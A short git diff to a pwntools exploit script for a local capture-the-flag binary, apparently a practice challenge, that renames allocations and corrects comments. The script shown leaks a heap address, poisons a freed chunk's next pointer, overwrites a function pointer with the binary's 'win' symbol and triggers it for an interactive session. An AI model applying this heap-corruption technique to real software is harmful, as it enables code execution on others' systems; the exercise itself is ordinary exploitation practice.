@@ -27,10 +27,9 @@ def print_name(uid):
 
 
 p = process('./chal')
-e = p.elf
 
-create(b'first')
-create(b'second')
+create(b'0th')
+create(b'1st')
 
 delete(b'1')
 delete(b'0')
@@ -41,15 +40,14 @@ heap_leak = u32(print_name(b'0'))
 # set the next pointer to be 0's meme pointer
 set_name(b'0', p32(heap_leak + 20))
 
-create(b'third')
-create(b'fourth')
-# the 4th create now points to the meme pointer of 1
+create(b'2nd')
+create(b'3rd')
+# 3rd's name now points to the function pointer of 0
 
-# overwrite that pointer with a one-gadget
-set_name(b'3', p32(e.symbols['win']))
+set_name(b'3', p32(p.elf.symbols['win']))
 
-# call system
-p.sendlineafter(b'uit\n', b'M')
+# call try()
+p.sendlineafter(b'uit\n', b'T')
 p.sendlineafter(b'\n', b'1')
 
 p.interactive()
